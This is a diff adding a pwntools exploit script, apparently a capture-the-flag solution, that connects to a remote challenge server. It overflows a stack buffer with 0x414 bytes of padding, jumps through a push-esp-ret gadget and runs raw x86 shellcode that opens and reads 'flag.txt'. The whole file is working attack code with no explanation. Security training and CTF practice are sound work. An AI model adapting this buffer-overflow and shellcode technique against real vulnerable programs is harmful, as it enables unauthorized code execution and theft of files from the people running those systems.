@@ -1,0 +1,18 @@
+from pwn import *
+
+r = remote("challenge.ctf.games", 30582)
+#r = remote("127.0.0.1", 9999)
+
+r.recvuntil(b'What would you like to say?:')
+
+push_esp_ret = 0x080491f5
+
+
+shellcode = b"\x31\xC0\x50\x68\x2E\x74\x78\x74\x68\x66\x6C\x61\x67\x89\xE3\x31\xC9\x31\xD2\x34\x05\xCD\x80\x89\xC3\xB9\x11\xB1\x04\x08\x80\xF2\x40\x31\xC0\xB0\x03\xCD\x80\x31\xC0\x34\x04\x89\xC3\x31\xC0\x34\x04\xCD\x80"
+
+
+payload =  b"a"*0x414 + p32(push_esp_ret) + shellcode  
+
+r.sendline(payload)
+
+r.interactive()
